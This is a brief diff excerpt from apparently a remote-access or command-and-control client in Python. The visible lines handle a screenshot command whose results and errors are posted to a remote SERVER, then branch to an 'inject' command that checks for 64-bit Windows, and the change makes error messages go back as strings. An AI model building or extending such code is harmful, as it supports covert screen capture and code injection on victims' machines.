@@ -297,7 +297,7 @@ try:
                         except ImportError:
                             s.post(SERVER, data='ERROR: Pillow module is not installed')
                         except Exception as screenshot_error:
-                            s.post(SERVER, data=screenshot_error)
+                            s.post(SERVER, data=str(screenshot_error))
                     elif inject.match(cmd):
                         if os.name == 'nt':
                             if not is_os_64bit():
